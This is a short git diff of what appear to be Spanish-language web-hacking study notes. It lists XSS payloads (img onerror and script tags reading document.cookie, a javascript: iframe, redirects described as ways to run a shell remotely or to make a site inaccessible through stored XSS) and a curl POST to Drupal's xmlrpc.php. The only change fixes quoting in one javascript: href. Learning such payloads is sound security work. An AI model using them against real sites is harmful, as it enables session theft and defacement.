@@ -41,7 +41,7 @@ curl --data @drupalxml.xml IP/xmlrpc.php
 		<img src="" onerror="alert(document.cookie)" />
 		<iframe src="javascript:alert('Hacked');" />
         <script>alert(document.cookie)</script> Para obtener la cookie de sesión
-	href="javascript:alert("test")"
+	href="javascript:alert('test')"
         <script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
             window.location = "http://informatica.ucm.es"; Se puede usar para dejar inaccesible una web en caso de stored xss
             También document.location.href = "http://informatica.ucm.es";
